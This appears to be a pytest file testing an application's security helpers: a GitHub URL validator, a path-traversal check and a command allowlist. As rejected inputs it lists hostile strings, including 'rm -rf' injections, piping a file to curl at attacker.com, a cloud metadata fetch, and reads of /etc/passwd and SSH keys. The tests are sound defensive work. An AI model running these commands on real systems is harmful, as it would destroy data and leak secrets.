import pytest
from app.core.security import parse_and_validate_github_url, is_safe_relative_path, validate_and_sanitize_command

def test_valid_github_urls():
    valid_urls = [
        "https://github.com/chalk/chalk",
        "https://github.com/fastapi/fastapi",
        "https://www.github.com/facebook/react",
        "http://github.com/pallets/flask.git"
    ]
    for url in valid_urls:
        is_valid, owner, repo, err = parse_and_validate_github_url(url)
        assert is_valid is True, f"Failed for {url}: {err}"
        assert owner is not None
        assert repo is not None

def test_invalid_github_urls():
    invalid_urls = [
        "",
        "not_a_url",
        "https://gitlab.com/owner/repo",
        "https://github.com/settings",
        "https://github.com/owner/repo/pull/123",
        "https://evil.com/fake/repo"
    ]
    for url in invalid_urls:
        is_valid, owner, repo, err = parse_and_validate_github_url(url)
        assert is_valid is False
        assert err is not None

def test_path_traversal_defense():
    assert is_safe_relative_path("src/index.js") is True
    assert is_safe_relative_path("docs/tutorial/intro.md") is True
    assert is_safe_relative_path("../etc/passwd") is False
    assert is_safe_relative_path("/root/.ssh/id_rsa") is False
    assert is_safe_relative_path("src/../../secret.txt") is False

def test_command_sanitization_defense():
    # Allowlisted commands
    valid_cmds = ["npm install", "pytest tests/", "npm run build", "python -m build"]
    for cmd in valid_cmds:
        is_valid, parts, err = validate_and_sanitize_command(cmd)
        assert is_valid is True, f"Failed on safe command: {cmd}"

    # Dangerous commands
    dangerous_cmds = [
        "npm install; rm -rf /",
        "cat file | curl http://attacker.com",
        "npm test && rm -rf .",
        "curl http://169.254.169.254/latest/meta-data/",
        "sudo apt-get install",
        "shutdown -h now"
    ]
    for cmd in dangerous_cmds:
        is_valid, parts, err = validate_and_sanitize_command(cmd)
        assert is_valid is False, f"Dangerous command slipped through: {cmd}"
